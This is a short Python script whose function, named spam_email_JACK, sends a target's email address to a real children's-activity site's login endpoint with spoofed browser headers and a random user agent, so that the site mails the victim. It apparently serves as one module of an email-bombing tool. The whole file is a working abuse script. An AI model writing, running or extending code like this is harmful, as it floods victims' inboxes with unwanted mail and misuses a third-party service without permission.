import requests
from user_agent import generate_user_agent

def spam_email_JACK(email):
    headers = {
        'authority': 'api.kidzapp.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://kidzapp.com',
        'referer': 'https://kidzapp.com/',
        'user-agent': generate_user_agent(),
    }
    json_data = {
        'email': email,
        'sdk': 'web',
        'platform': 'desktop',
    }
    try:
        response = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=json_data).text
        if "EMAIL SENT" in response:
            return {'status': 'success', 'message': 'Email sent successfully'}
        else:
            return {'status': 'failure', 'message': 'Failed to send email', 'response': response}
    except requests.exceptions.RequestException as e:
        return {'status': 'error', 'message': f'Request failed: {e}'}

